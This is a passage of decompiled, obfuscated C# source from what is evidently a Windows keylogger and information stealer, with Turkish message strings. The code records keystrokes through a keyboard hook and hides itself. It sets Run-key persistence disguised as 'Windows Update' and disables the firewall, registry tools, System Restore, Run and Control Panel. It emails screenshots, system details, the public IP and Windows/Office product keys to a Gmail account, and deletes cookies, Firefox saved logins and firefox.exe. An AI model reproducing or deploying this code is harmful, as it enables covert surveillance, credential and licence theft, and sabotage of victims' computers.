          case Keys.F8:
            this.TextBox1.Text += "[F8]";
            break;
          case Keys.F9:
            this.TextBox1.Text += "[F9]";
            break;
          case Keys.F10:
            this.TextBox1.Text += "[F10]";
            break;
          case Keys.F11:
            this.TextBox1.Text += "[F11]";
            break;
          case Keys.F12:
            this.TextBox1.Text += "[F12]";
            break;
          case Keys.OemSemicolon:
            this.TextBox1.Text += ":";
            break;
          case Keys.Oemcomma:
            this.TextBox1.Text += "<";
            break;
          case Keys.OemMinus:
            this.TextBox1.Text += "_";
            break;
          case Keys.OemPeriod:
            this.TextBox1.Text += ">";
            break;
          case Keys.OemQuestion:
            this.TextBox1.Text += "?";
            break;
          case Keys.Oemtilde:
            this.TextBox1.Text += "~";
            break;
          case Keys.OemOpenBrackets:
            this.TextBox1.Text += "{";
            break;
          case Keys.OemPipe:
            this.TextBox1.Text += "|";
            break;
          case Keys.OemCloseBrackets:
            this.TextBox1.Text += "}";
            break;
          case Keys.OemQuotes:
            this.TextBox1.Text += "'";
            break;
        }
      }
      else if (!\u0001.Computer.Keyboard.ShiftKeyDown & \u0001.Computer.Keyboard.CapsLock)
      {
        switch (Key)
        {
          case Keys.Back:
            this.TextBox1.Text = this.TextBox1.Text.Remove(checked (this.TextBox1.Text.Length - 1), 1);
            break;
          case Keys.Tab:
            this.TextBox1.Text += "[TAB]";
            break;
          case Keys.Return:
            this.TextBox1.Text += "\r\n";
            break;
          case Keys.Escape:
            this.TextBox1.Text += "[ESC]";
            break;
          case Keys.Space:
            this.TextBox1.Text += " ";
            break;
          case Keys.End:
            this.TextBox1.Text += "[END]";
            break;
          case Keys.Left:
            this.TextBox1.Text += "?";
            break;
          case Keys.Up:
            this.TextBox1.Text += "?";
            break;
          case Keys.Right:
            this.TextBox1.Text += "?";
            break;
          case Keys.Down:
            this.TextBox1.Text += "?";
            break;
          case Keys.Delete:
            this.TextBox1.Text = this.TextBox1.Text.Remove(checked (this.TextBox1.Text.Length - 1), 1);
            break;
          case Keys.D0:
            this.TextBox1.Text += "0";
            break;
          case Keys.D1:
            this.TextBox1.Text += "1";
            break;
          case Keys.D2:
            this.TextBox1.Text += "2";
            break;
          case Keys.D3:
            this.TextBox1.Text += "3";
            break;
          case Keys.D4:
            this.TextBox1.Text += "4";
            break;
          case Keys.D5:
            this.TextBox1.Text += "5";
            break;
          case Keys.D6:
            this.TextBox1.Text += "6";
            break;
          case Keys.D7:
            this.TextBox1.Text += "7";
            break;
          case Keys.D8:
            this.TextBox1.Text += "8";
            break;
          case Keys.D9:
            this.TextBox1.Text += "9";
            break;
          case Keys.A:
            this.TextBox1.Text += "a";
            break;
          case Keys.B:
            this.TextBox1.Text += "b";
            break;
          case Keys.C:
            this.TextBox1.Text += "c";
            break;
          case Keys.D:
            this.TextBox1.Text += "d";
            break;
          case Keys.E:
            this.TextBox1.Text += "e";
            break;
          case Keys.F:
            this.TextBox1.Text += "f";
            break;
          case Keys.G:
            this.TextBox1.Text += "g";
            break;
          case Keys.H:
            this.TextBox1.Text += "h";
            break;
          case Keys.I:
            this.TextBox1.Text += "i";
            break;
          case Keys.J:
            this.TextBox1.Text += "j";
            break;
          case Keys.K:
            this.TextBox1.Text += "k";
            break;
          case Keys.L:
            this.TextBox1.Text += "l";
            break;
          case Keys.M:
            this.TextBox1.Text += "m";
            break;
          case Keys.N:
            this.TextBox1.Text += "n";
            break;
          case Keys.O:
            this.TextBox1.Text += "o";
            break;
          case Keys.P:
            this.TextBox1.Text += "p";
            break;
          case Keys.Q:
            this.TextBox1.Text += "q";
            break;
          case Keys.R:
            this.TextBox1.Text += "r";
            break;
          case Keys.S:
            this.TextBox1.Text += "s";
            break;
          case Keys.T:
            this.TextBox1.Text += "t";
            break;
          case Keys.U:
            this.TextBox1.Text += "u";
            break;
          case Keys.V:
            this.TextBox1.Text += "v";
            break;
          case Keys.W:
            this.TextBox1.Text += "w";
            break;
          case Keys.X:
            this.TextBox1.Text += "x";
            break;
          case Keys.Y:
            this.TextBox1.Text += "y";
            break;
          case Keys.Z:
            this.TextBox1.Text += "z";
            break;
          case Keys.Multiply:
            this.TextBox1.Text += "*";
            break;
          case Keys.Add:
            this.TextBox1.Text += "+";
            break;
          case Keys.Subtract:
            this.TextBox1.Text += "-";
            break;
          case Keys.Decimal:
            this.TextBox1.Text += ".";
            break;
          case Keys.Divide:
            this.TextBox1.Text += "/";
            break;
          case Keys.F1:
            this.TextBox1.Text += "[F1]";
            break;
          case Keys.F2:
            this.TextBox1.Text += "[F2]";
            break;
          case Keys.F3:
            this.TextBox1.Text += "[F3]";
            break;
          case Keys.F4:
            this.TextBox1.Text += "[F4]";
            break;
          case Keys.F5:
            this.TextBox1.Text += "[F5]";
            break;
          case Keys.F6:
            this.TextBox1.Text += "[F6]";
            break;
          case Keys.F7:
            this.TextBox1.Text += "[F7]";
            break;
          case Keys.F8:
            this.TextBox1.Text += "[F8]";
            break;
          case Keys.F9:
            this.TextBox1.Text += "[F9]";
            break;
          case Keys.F10:
            this.TextBox1.Text += "[F10]";
            break;
          case Keys.F11:
            this.TextBox1.Text += "[F11]";
            break;
          case Keys.F12:
            this.TextBox1.Text += "[F12]";
            break;
          case Keys.OemSemicolon:
            this.TextBox1.Text += ";";
            break;
          case Keys.Oemcomma:
            this.TextBox1.Text += ",";
            break;
          case Keys.OemMinus:
            this.TextBox1.Text += "-";
            break;
          case Keys.OemPeriod:
            this.TextBox1.Text += ".";
            break;
          case Keys.OemQuestion:
            this.TextBox1.Text += "/";
            break;
          case Keys.Oemtilde:
            this.TextBox1.Text += "`";
            break;
          case Keys.OemOpenBrackets:
            this.TextBox1.Text += "[";
            break;
          case Keys.OemPipe:
            this.TextBox1.Text += "\\";
            break;
          case Keys.OemCloseBrackets:
            this.TextBox1.Text += "]";
            break;
          case Keys.OemQuotes:
            this.TextBox1.Text += "'";
            break;
        }
      }
      else
      {
        if (!(\u0001.Computer.Keyboard.ShiftKeyDown & !\u0001.Computer.Keyboard.CapsLock))
          return;
        switch (Key)
        {
          case Keys.Back:
            this.TextBox1.Text = this.TextBox1.Text.Remove(checked (this.TextBox1.Text.Length - 1), 1);
            break;
          case Keys.Tab:
            this.TextBox1.Text += "[TAB]";
            break;
          case Keys.Return:
            this.TextBox1.Text += "\r\n";
            break;
          case Keys.Escape:
            this.TextBox1.Text += "[ESC]";
            break;
          case Keys.Space:
            this.TextBox1.Text += " ";
            break;
          case Keys.End:
            this.TextBox1.Text += "[END]";
            break;
          case Keys.Left:
            this.TextBox1.Text += "?";
            break;
          case Keys.Up:
            this.TextBox1.Text += "?";
            break;
          case Keys.Right:
            this.TextBox1.Text += "?";
            break;
          case Keys.Down:
            this.TextBox1.Text += "?";
            break;
          case Keys.Delete:
            this.TextBox1.Text = this.TextBox1.Text.Remove(checked (this.TextBox1.Text.Length - 1), 1);
            break;
          case Keys.D0:
            this.TextBox1.Text += ")";
            break;
          case Keys.D1:
            this.TextBox1.Text += "!";
            break;
          case Keys.D2:
            this.TextBox1.Text += "@";
            break;
          case Keys.D3:
            this.TextBox1.Text += "#";
            break;
          case Keys.D4:
            this.TextBox1.Text += "$";
            break;
          case Keys.D5:
            this.TextBox1.Text += "%";
            break;
          case Keys.D6:
            this.TextBox1.Text += "^";
            break;
          case Keys.D7:
            this.TextBox1.Text += "&";
            break;
          case Keys.D8:
            this.TextBox1.Text += "*";
            break;
          case Keys.D9:
            this.TextBox1.Text += "(";
            break;
          case Keys.A:
            this.TextBox1.Text += "A";
            break;
          case Keys.B:
            this.TextBox1.Text += "B";
            break;
          case Keys.C:
            this.TextBox1.Text += "C";
            break;
          case Keys.D:
            this.TextBox1.Text += "D";
            break;
          case Keys.E:
            this.TextBox1.Text += "E";
            break;
          case Keys.F:
            this.TextBox1.Text += "F";
            break;
          case Keys.G:
            this.TextBox1.Text += "G";
            break;
          case Keys.H:
            this.TextBox1.Text += "H";
            break;
          case Keys.I:
            this.TextBox1.Text += "I";
            break;
          case Keys.J:
            this.TextBox1.Text += "J";
            break;
          case Keys.K:
            this.TextBox1.Text += "K";
            break;
          case Keys.L:
            this.TextBox1.Text += "L";
            break;
          case Keys.M:
            this.TextBox1.Text += "M";
            break;
          case Keys.N:
            this.TextBox1.Text += "N";
            break;
          case Keys.O:
            this.TextBox1.Text += "O";
            break;
          case Keys.P:
            this.TextBox1.Text += "P";
            break;
          case Keys.Q:
            this.TextBox1.Text += "Q";
            break;
          case Keys.R:
            this.TextBox1.Text += "R";
            break;
          case Keys.S:
            this.TextBox1.Text += "S";
            break;
          case Keys.T:
            this.TextBox1.Text += "T";
            break;
          case Keys.U:
            this.TextBox1.Text += "U";
            break;
          case Keys.V:
            this.TextBox1.Text += "V";
            break;
          case Keys.W:
            this.TextBox1.Text += "W";
            break;
          case Keys.X:
            this.TextBox1.Text += "X";
            break;
          case Keys.Y:
            this.TextBox1.Text += "Y";
            break;
          case Keys.Z:
            this.TextBox1.Text += "Z";
            break;
          case Keys.Multiply:
            this.TextBox1.Text += "*";
            break;
          case Keys.Add:
            this.TextBox1.Text += "+";
            break;
          case Keys.Subtract:
            this.TextBox1.Text += "-";
            break;
          case Keys.Decimal:
            this.TextBox1.Text += ".";
            break;
          case Keys.Divide:
            this.TextBox1.Text += "/";
            break;
          case Keys.F1:
            this.TextBox1.Text += "[F1]";
            break;
          case Keys.F2:
            this.TextBox1.Text += "[F2]";
            break;
          case Keys.F3:
            this.TextBox1.Text += "[F3]";
            break;
          case Keys.F4:
            this.TextBox1.Text += "[F4]";
            break;
          case Keys.F5:
            this.TextBox1.Text += "[F5]";
            break;
          case Keys.F6:
            this.TextBox1.Text += "[F6]";
            break;
          case Keys.F7:
            this.TextBox1.Text += "[F7]";
            break;
          case Keys.F8:
            this.TextBox1.Text += "[F8]";
            break;
          case Keys.F9:
            this.TextBox1.Text += "[F9]";
            break;
          case Keys.F10:
            this.TextBox1.Text += "[F10]";
            break;
          case Keys.F11:
            this.TextBox1.Text += "[F11]";
            break;
          case Keys.F12:
            this.TextBox1.Text += "[F12]";
            break;
          case Keys.OemSemicolon:
            this.TextBox1.Text += ":";
            break;
          case Keys.Oemcomma:
            this.TextBox1.Text += "<";
            break;
          case Keys.OemMinus:
            this.TextBox1.Text += "_";
            break;
          case Keys.OemPeriod:
            this.TextBox1.Text += ">";
            break;
          case Keys.OemQuestion:
            this.TextBox1.Text += "?";
            break;
          case Keys.Oemtilde:
            this.TextBox1.Text += "~";
            break;
          case Keys.OemOpenBrackets:
            this.TextBox1.Text += "{";
            break;
          case Keys.OemPipe:
            this.TextBox1.Text += "|";
            break;
          case Keys.OemCloseBrackets:
            this.TextBox1.Text += "}";
            break;
          case Keys.OemQuotes:
            this.TextBox1.Text += "'";
            break;
        }
      }
    }

    private void \u0003(object sender, EventArgs e)
    {
      if (Operators.CompareString(this.\u0089, this.\u0002(), false) == 0)
        return;
      this.TextBox1.Text = this.TextBox1.Text + "\r\n[" + this.\u0002() + "]:\r\n";
      this.\u0089 = this.\u0002();
    }

    private void \u0004(object sender, EventArgs e)
    {
      FileSystem.FileOpen(1, Application.ExecutablePath, OpenMode.Binary, OpenAccess.Read, OpenShare.Shared);
      this.\u0001 = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u0002 = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u0003 = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u0004 = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u0005 = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u0006 = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u0007 = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u0008 = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u001C = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u001D = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u001E = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u001F = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u000E = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u000F = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u0010 = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u0082 = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u0011 = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u0012 = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u0013 = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u0014 = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u0015 = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u0016 = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u0017 = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u0018 = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u0019 = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u001A = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u001B = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u007F = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u0080 = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u0081 = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u0083 = Strings.Space(checked ((int) FileSystem.LOF(1)));
      FileSystem.FileGet(1, ref this.\u0001);
      FileSystem.FileGet(1, ref this.\u0002);
      FileSystem.FileGet(1, ref this.\u0004);
      FileSystem.FileGet(1, ref this.\u0005);
      FileSystem.FileGet(1, ref this.\u0006);
      FileSystem.FileGet(1, ref this.\u0007);
      FileSystem.FileGet(1, ref this.\u0008);
      FileSystem.FileGet(1, ref this.\u001C);
      FileSystem.FileGet(1, ref this.\u001D);
      FileSystem.FileGet(1, ref this.\u001E);
      FileSystem.FileGet(1, ref this.\u001F);
      FileSystem.FileGet(1, ref this.\u000E);
      FileSystem.FileGet(1, ref this.\u000F);
      FileSystem.FileGet(1, ref this.\u0010);
      FileSystem.FileGet(1, ref this.\u0082);
      FileSystem.FileGet(1, ref this.\u0011);
      FileSystem.FileGet(1, ref this.\u0012);
      FileSystem.FileGet(1, ref this.\u0013);
      FileSystem.FileGet(1, ref this.\u0014);
      FileSystem.FileGet(1, ref this.\u0015);
      FileSystem.FileGet(1, ref this.\u0016);
      FileSystem.FileGet(1, ref this.\u0017);
      FileSystem.FileGet(1, ref this.\u0018);
      FileSystem.FileGet(1, ref this.\u0019);
      FileSystem.FileGet(1, ref this.\u001A);
      FileSystem.FileGet(1, ref this.\u001B);
      FileSystem.FileGet(1, ref this.\u007F);
      FileSystem.FileGet(1, ref this.\u0080);
      FileSystem.FileGet(1, ref this.\u0081);
      FileSystem.FileGet(1, ref this.\u0083);
      FileSystem.FileClose(1);
      this.\u0001 = Strings.Split(this.\u0001, "@JTR");
      this.TextBox2.Text = this.\u0001[1];
      this.TextBox3.Text = this.\u0001[2];
      this.TextBox4.Text = Conversions.ToString(Convert.ToInt32(this.\u0001[3]));
      this.Timer1.Interval = Conversions.ToInteger(this.TextBox4.Text);
      this.Timer3.Interval = Conversions.ToInteger(this.TextBox4.Text);
      this.Timer4.Interval = Conversions.ToInteger(this.TextBox4.Text);
      this.Timer5.Interval = Conversions.ToInteger(this.TextBox4.Text);
      this.Timer1.Start();
      this.Timer2.Start();
      if (Conversions.ToBoolean(this.\u0001[4]))
      {
        try
        {
          string fileName = Path.GetFileName(Application.ExecutablePath);
          \u0001.Computer.FileSystem.CopyFile(Application.ExecutablePath, "C:\\Windows\\system32" + fileName, true);
          RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
          registryKey.SetValue(fileName, (object) ("C:\\Windows\\system32" + Conversions.ToString(0)));
          registryKey.Close();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Conversions.ToBoolean(this.\u0001[5]))
        this.\u0002("ker.exe");
      if (Conversions.ToBoolean(this.\u0001[6]))
      {
        try
        {
          System.IO.File.SetAttributes(Application.ExecutablePath, FileAttributes.Hidden);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Conversions.ToBoolean(this.\u0001[7]))
      {
        try
        {
          \u0001.Computer.Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "EnableBalloonTips", (object) "0", RegistryValueKind.DWord);
          Process process = new Process();
          string str = "netsh.exe";
          process.StartInfo.Arguments = "firewall set opmode disable";
          process.StartInfo.FileName = str;
          process.StartInfo.UseShellExecute = false;
          process.StartInfo.RedirectStandardOutput = true;
          process.StartInfo.CreateNoWindow = true;
          process.Start();
          process.WaitForExit();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Conversions.ToBoolean(this.\u0001[8]))
        \u0001.Computer.Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableRegistryTools", (object) "1", RegistryValueKind.String);
      if (Conversions.ToBoolean(this.\u0001[9]))
        \u0001.Computer.Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore", "DisableSR", (object) "1", RegistryValueKind.DWord);
      if (Conversions.ToBoolean(this.\u0001[10]))
        Interaction.Shell("REG add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v NoRun /t REG_DWORD /d 1 /f", AppWinStyle.NormalFocus);
      if (Conversions.ToBoolean(this.\u0001[11]))
        Interaction.Shell("REG add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v NoControlPanel /t REG_DWORD /d 1 /f", AppWinStyle.NormalFocus);
      if (!Conversions.ToBoolean(this.\u0001[12]))
        this.Timer4.Start();
      if (!Conversions.ToBoolean(this.\u0001[13]))
        this.Timer5.Start();
      if (Conversions.ToBoolean(this.\u0001[15]))
      {
        this.\u0002(true);
        this.\u0003(true);
      }
      if (!Conversions.ToBoolean(this.\u0001[25]))
        this.Timer3.Start();
      Conversions.ToBoolean(this.\u0001[26]);
      if (Conversions.ToBoolean(this.\u0001[27]))
      {
        string str = Conversions.ToString(\u0001.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "PathName", (object) null));
        if (System.IO.File.Exists(str + "\\system32\\"))
          \u0001.Computer.FileSystem.DeleteFile(str + "\\system32\\");
        System.IO.File.Copy(Application.ExecutablePath, str + "\\system32\\");
        \u0001.Computer.Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "Windows Update", (object) (str + "\\system32\\"), RegistryValueKind.String);
      }
      if (Conversions.ToBoolean(this.\u0001[28]))
        Interaction.Shell(Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\taskmgr.exe", AppWinStyle.Hide, true);
      Conversions.ToBoolean(this.\u0001[29]);
      if (Conversions.ToBoolean(this.\u0001[30]))
      {
        try
        {
          string path = "C:\\Program Files\\Mozilla Firefox\\firefox.exe";
          if (System.IO.File.Exists(path))
            System.IO.File.Delete(path);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      this.Hide();
      this.Visible = false;
    }

    public void \u0002(string NewName)
    {
label_0:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = -2;
label_1:
        int num3 = 2;
        string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
label_2:
        num3 = 3;
        if (Operators.CompareString(Application.StartupPath, folderPath, false) == 0)
          goto label_6;
label_3:
        num3 = 4;
        System.IO.File.Copy(Application.ExecutablePath, folderPath + "\\update.exe" + NewName);
label_4:
        num3 = 5;
        Process.Start(folderPath + "\\update.exe" + NewName + " " + Application.ExecutablePath);
label_5:
        num3 = 6;
        System.IO.File.SetAttributes(folderPath + "update.exe\\" + NewName, FileAttributes.Hidden);
        ProjectData.EndApp();
        goto label_14;
label_6:
        num3 = 9;
label_7:
        num3 = 10;
        FileSystem.Kill(Interaction.Command());
        goto label_14;
label_9:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_2;
              case 4:
                goto label_3;
              case 5:
                goto label_4;
              case 6:
                goto label_5;
              case 7:
              case 8:
              case 11:
              case 12:
                goto label_14;
              case 9:
                goto label_6;
              case 10:
                goto label_7;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_9;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_14:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    private void \u0005(object sender, EventArgs e)
    {
      try
      {
        this.TextBox4.Text = this.TextBox7.Text + "\\" + this.TextBox6.Text + this.TextBox5.Text;
        Size blockRegionSize = new Size(\u0001.Computer.Screen.Bounds.Width, \u0001.Computer.Screen.Bounds.Height);
        Bitmap bitmap = new Bitmap(\u0001.Computer.Screen.Bounds.Width, \u0001.Computer.Screen.Bounds.Height);
        Graphics.FromImage((Image) bitmap).CopyFromScreen(new Point(0, 0), new Point(0, 0), blockRegionSize);
        bitmap.Save(this.TextBox7.Text + "\\" + this.TextBox6.Text + this.TextBox5.Text);
        TextBox textBox6 = this.TextBox6;
        textBox6.Text = Conversions.ToString(Conversions.ToDouble(textBox6.Text) + 1.0);
        MailMessage message = new MailMessage();
        message.From = new MailAddress(this.TextBox2.Text);
        message.To.Add(this.TextBox2.Text);
        message.Subject = "Ekran Kayıtları " + this.\u0086;
        message.Body = "Görüntüler  \r\n----------------------------------------------------------------\r\n\r\n";
        Attachment attachment = new Attachment(this.TextBox4.Text);
        message.Attachments.Add(attachment);
        new SmtpClient("smtp.gmail.com")
        {
          Port = 587,
          Credentials = ((ICredentialsByHost) new NetworkCredential(this.TextBox2.Text, this.TextBox3.Text)),
          EnableSsl = true
        }.Send(message);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void \u0006(object sender, EventArgs e)
    {
      this.\u0003();
      try
      {
        new SmtpClient("smtp.gmail.com")
        {
          Port = 587,
          EnableSsl = true,
          Credentials = ((ICredentialsByHost) new NetworkCredential(this.TextBox2.Text, this.TextBox3.Text))
        }.Send(new MailMessage()
        {
          Subject = \u0001.Computer.Name + " Bilgisayar Bilgileri",
          To = {
            this.TextBox2.Text
          },
          From = new MailAddress(this.TextBox2.Text),
          Body = "Kullanıcı Adı : " + Environment.UserName + "\r\nBilgisayarın Adı : " + \u0001.Computer.Name + "\r\nİşletim Sistemi Versiyonu : " + Environment.OSVersion.ToString() + "\r\nKök Klasör Yolu : " + Environment.SystemDirectory.ToString() + "\r\nIP: " + this.\u0087
        });
        this.TextBox1.Clear();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      this.Timer4.Stop();
    }

    private void \u0003()
    {
      try
      {
        this.\u0087 = Encoding.ASCII.GetString(this.\u0001.DownloadData("http://whatismyip.com/automation/n09230945.asp"));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void \u0007(object sender, EventArgs e)
    {
label_0:
      int num1;
      int num2;
      try
      {
        int num3 = 1;
        this.txtWin.Text = this.txtWin.Text + DateAndTime.Now.ToString() + "\r\n\r\n";
label_1:
        num3 = 2;
        byte[] digitalProductId1 = \u0002.\u0002.\u0002(\u0002.\u0002.\u0001.\u0001);
label_2:
        num3 = 3;
        this.txtWin.Text = this.txtWin.Text + \u0001.Computer.Info.OSFullName + "\r\n";
label_3:
        num3 = 4;
        this.txtWin.Text = this.txtWin.Text + \u0002.\u0002.\u0002(digitalProductId1) + "\r\n\r\n";
label_4:
        ProjectData.ClearProjectError();
        num1 = -2;
label_5:
        num3 = 6;
        string str = (string) Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Office\\12.0\\Registration\\{91120000-002F-0000-0000-0000000FF1CE}").GetValue("ProductName");
label_6:
        num3 = 7;
        this.txtWin.Text = this.txtWin.Text + str + "\r\n";
label_7:
        ProjectData.ClearProjectError();
        num1 = -3;
label_8:
        num3 = 9;
        byte[] digitalProductId2 = \u0002.\u0002.\u0002(\u0002.\u0002.\u0001.\u0003);
label_9:
        num3 = 10;
        this.txtWin.Text = this.txtWin.Text + \u0002.\u0002.\u0002(digitalProductId2) + "\r\n\r\n";
label_10:
        num3 = 11;
        MailMessage message = new MailMessage();
label_11:
        num3 = 12;
        message.Subject = \u0001.Computer.Name + "Office Serialleri";
label_12:
        num3 = 13;
        message.To.Add(this.TextBox2.Text);
label_13:
        num3 = 14;
        message.From = new MailAddress(this.TextBox2.Text);
label_14:
        num3 = 15;
        message.Body = this.txtWin.Text;
label_15:
        num3 = 16;
        SmtpClient smtpClient = new SmtpClient("smtp.gmail.com");
label_16:
        num3 = 17;
        smtpClient.Port = 587;
label_17:
        num3 = 18;
        smtpClient.EnableSsl = true;
label_18:
        num3 = 19;
        smtpClient.Credentials = (ICredentialsByHost) new NetworkCredential(this.TextBox2.Text, this.TextBox3.Text);
label_19:
        num3 = 20;
        smtpClient.Send(message);
label_20:
        num3 = 21;
        this.TextBox1.Clear();
label_21:
        num3 = 22;
        this.Timer5.Stop();
        goto label_28;
label_23:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_2;
              case 4:
                goto label_3;
              case 5:
                goto label_4;
              case 6:
                goto label_5;
              case 7:
                goto label_6;
              case 8:
                goto label_7;
              case 9:
                goto label_8;
              case 10:
                goto label_9;
              case 11:
                goto label_10;
              case 12:
                goto label_11;
              case 13:
                goto label_12;
              case 14:
                goto label_13;
              case 15:
                goto label_14;
              case 16:
                goto label_15;
              case 17:
                goto label_16;
              case 18:
                goto label_17;
              case 19:
                goto label_18;
              case 20:
                goto label_19;
              case 21:
                goto label_20;
              case 22:
                goto label_21;
              case 23:
                goto label_28;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_23;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_28:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    public void \u0002(bool Enable)
    {
      if (!Enable)
        return;
      string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Cookies);
      if (!Directory.Exists(folderPath))
        return;
      try
      {
        foreach (string file in \u0001.Computer.FileSystem.GetFiles(folderPath))
        {
          try
          {
            \u0001.Computer.FileSystem.DeleteFile(file);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
      }
      finally
      {
        IEnumerator<string> enumerator;
        enumerator?.Dispose();
      }
    }

    public void \u0003(bool Enable)
    {
      if (!Enable)
        return;
      string str = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Mozilla\\Firefox\\Profiles";
      if (!Directory.Exists(str))
        return;
      try
      {
        foreach (string directory in \u0001.Computer.FileSystem.GetDirectories(str))
        {
          try
          {
            foreach (string file in \u0001.Computer.FileSystem.GetFiles(directory))
            {
              if (file.Contains("cookie"))
              {
                try
                {
                  \u0001.Computer.FileSystem.DeleteFile(file);
                }
                catch (Exception ex)
                {
                  ProjectData.SetProjectError(ex);
                  ProjectData.ClearProjectError();
                }
              }
            }
          }
          finally
          {
            IEnumerator<string> enumerator;
            enumerator?.Dispose();
          }
        }
      }
      finally
      {
        IEnumerator<string> enumerator;
        enumerator?.Dispose();
      }
    }

    public void \u0004(bool Enable)
    {
      if (!Enable)
        return;
      string str = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Mozilla\\Firefox\\Profiles";
      if (!Directory.Exists(str))
        return;
      try
      {
        foreach (string directory in \u0001.Computer.FileSystem.GetDirectories(str))
        {
          try
          {
            foreach (string file in \u0001.Computer.FileSystem.GetFiles(directory))
            {
              if (file.Contains("signon"))
              {
                try
                {
                  \u0001.Computer.FileSystem.DeleteFile(file);
                }
                catch (Exception ex)
                {
                  ProjectData.SetProjectError(ex);
                  ProjectData.ClearProjectError();
                }
              }
            }
          }
          finally
          {
            IEnumerator<string> enumerator;
            enumerator?.Dispose();
          }
        }
      }
      finally
      {
        IEnumerator<string> enumerator;
        enumerator?.Dispose();
      }
    }

    internal class \u0001
    {
      private const int \u0001 = 0;
      private const int \u0002 = 13;
      private const int \u0003 = 256;
      private const int \u0004 = 257;
      private const int \u0005 = 260;
      private const int \u0006 = 261;
      private static int \u0007;
      private static \u0003.\u0002.\u0001.\u0002 \u0001;

      [DllImport("user32", EntryPoint = "SetWindowsHookExA", CharSet = CharSet.Ansi, SetLastError = true)]
      private static extern int \u0002(
        int idHook,
        \u0003.\u0002.\u0001.\u0002 lpfn,
        int hmod,
        int dwThreadId);

      [DllImport("user32", EntryPoint = "CallNextHookEx", CharSet = CharSet.Ansi, SetLastError = true)]
      private static extern int \u0002(
        int hHook,
        int nCode,
        int wParam,
        \u0003.\u0002.\u0001.\u0001 lParam);

